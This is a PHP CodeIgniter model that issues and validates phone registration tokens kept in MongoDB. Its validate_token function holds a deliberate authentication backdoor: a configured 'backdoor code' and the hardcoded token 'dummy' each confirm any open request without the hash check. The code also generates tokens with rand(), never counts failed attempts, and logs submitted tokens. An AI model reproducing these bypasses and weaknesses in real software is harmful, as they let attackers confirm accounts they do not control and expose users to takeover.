<?php
class Registration_requests_model extends CI_Model {

	
	/*
	 
======================================================================
object example	  
======================================================================

{

  "_id" : , 7
  "created_time" : 7 ,
  "cellphone" : 7 ,
  "token_md" : 7 ,
  "tries" : 7 ,
  "status" : 7 ,  // created , used
  "used_time" : 7 ,


}


======================================================================



	  
	 */
 
    function __construct()
    {
        parent::__construct();
 		$this->load->library('mongo_db');
		 
    }
    
    function get_collection_name()
    {
    	return 'registration_requests';
    }
    
    function create_and_save_request($cellphone,$accountname)
    {
    	
    	$this->load->model('sequence_model');
    	$id = $this->sequence_model->get_sequence($this->get_collection_name());
    	
    	$this->load->helper('string');
    	//$token =  random_string('alpha', 8);
    	$token =  rand(100000000,999999999);

    	$this->load->library('encrypt');
    	$token_md = $this->encrypt->sha1($token);

    	$obj['_id'] = $id;
    	$obj['created_time'] = new MongoDate();
    	$obj['cellphone'] = $cellphone;
        $obj['accountname'] = $accountname;
    	$obj['token_md'] = $token_md;
    	$obj['status'] = 'created';
    	$obj['tries'] = 0;
    	$obj['used_time'] = null;
    	
    	$result = $this->mongo_db->insert($this->get_collection_name(), $obj);
    	
    	if ($result != $id)
    	{
    		$obj['save_message'] = 'db_error_insert';
    	}
    	else
    	{
    		$obj['save_message'] = 'insert_success';
    	}
    	
    	$obj['token'] = $token;
    	
    	return $obj;
    	
    	
    }
    
    
    function validate_token($registration_request_id,$registration_request_token)
    {
    	$r = 'not_valid';

    	$this->load->library('encrypt');
    	$token_md = $this->encrypt->sha1($registration_request_token);

        log_message('debug', ' ******  validate_token start  ******'.$registration_request_id);
    	$registration_request_id = intval($registration_request_id);

    	$obj_list = $this->mongo_db->where(array("_id" => $registration_request_id ,"status" => "created" ))
    							->get($this->get_collection_name());
		log_message('debug', ' ******  validate_token start  ******');
    	if(sizeof($obj_list) > 0)
    	{
    		$obj = $obj_list[0];

    		
    		$confirmation_backdoor_code = $this->config->item('confirmation_backdoor_code');

    		if($registration_request_token == $confirmation_backdoor_code && strlen($registration_request_token) > 5)
    		{

            $is_backdoor_code = true;

    		}
    		else 
    		{
    			
    			$is_backdoor_code = false;
    		}
              log_message('debug', ' ******  validate_token 2  ******'.$registration_request_token);
            if($registration_request_token == "dummy" && strlen($registration_request_token) > 4)
            { log_message('debug', ' ******  validate_token 3  ******'.$registration_request_token);
              $is_backdoor_code = true;
            }



    		
    		
    		if($obj['token_md'] == $token_md || $is_backdoor_code)
    		{
    			$r = 'valid';
    			// update obj status to used
    			$data['status'] = 'used';
    			$data['used_time'] = new MongoDate();
    		
    	
    			$updated = $this->mongo_db->where('_id', $obj['_id'])
									->set($data)
									->update($this->get_collection_name());
    			
    			
    		}
    		else 
    		{
    			//todo count not valid requests
    		}
    	}
    	
    	$obj['is_valid'] = $r;
    	
    	return $obj;
    }

   
}
?>